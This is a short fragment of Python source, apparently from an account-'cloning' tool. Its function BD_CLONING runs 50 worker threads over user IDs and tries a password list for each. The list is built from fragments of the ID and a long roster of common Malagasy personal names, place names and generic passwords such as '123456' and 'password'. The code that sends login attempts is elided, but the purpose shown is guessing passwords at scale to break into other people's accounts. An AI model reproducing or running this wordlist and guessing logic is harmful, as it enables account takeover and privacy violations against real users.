...
def BD_CLONING():
    ...
    with tred(max_workers=50) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nantenaina','Nantenaina','michou','Rakoto','rakoto','Michou','Lalaina','lalaina','diamondra','Diamondra','mamisoa','Mamisoa','fitia','Fitia','nomena', 'nomena','Nomena','mamolava','vololona','Vololona','ferdinand','Ferdinand','joselain','Joselain','jehovah','Jehovah','richard','Richard','vadikely','Vadikely','mamakely','Mamakely','dadakely','Dadakely','Fiainana','fiainana','andry','michel','Michel','fanantenana','Fanantenana','madmax','Madmax','Mamako','Mamiko','Jeneraly','jeneraly','ragasy','Ragasy','solofo','Solofo','123456','michael','football','superman','batman','domoina','12345','Domoina','lanto','finaritra','Finaritra','mamanay','Mamanay','dadanay','Dadanay','zanako','Zanako','sarobidy','Sarobidy','malaso','Malaso','dahalo','Dahalo','valisoa','Valisoa','narindra','Narindra','daniela','Daniela','chérie','Chérie','milely','Milely','madagasikara','Madagasikara','lalatiana','Lalatiana','sarah','Sarah','fabien','Fabien','farao','Farao','Frédéric','frédéric','volatiana','Volatiana','massage','Massage','porno','Porno','password','Password','mivady','Mivady','fanomezana','Fanomezana','martine','Martine','nirina','Nirina','radonirina','erik manana','deliance','Deliance','dokotera','Dokotera','Aina','aina','rasoa','Rasoa','Tiavina','tiavina','zazakely','Zazakely','sarindra','Sarindra','nandrianina','Nandrianina','Lanto','mahefa','Mahefa','miora','Miora','maraina','Maraina','hariva','Hariva','mimoza','Mimoza','safidiniaina','Safidiniaina','anthonio','Anthonio','Anjara','anjara','andry rajoelina','Andry rajoelina','siteny','Siteny','Mahery','mahery','kimaso','kaylelena','sodoma','Sodoma','mahamasina','Mahamasina','tahinaa','Tahiana','analakely','Analakely','ambanidia','Ambanidia','gendarme','Gendarme','polisy','Polisy','william','William','niaina','Niaina','marion','Marion']
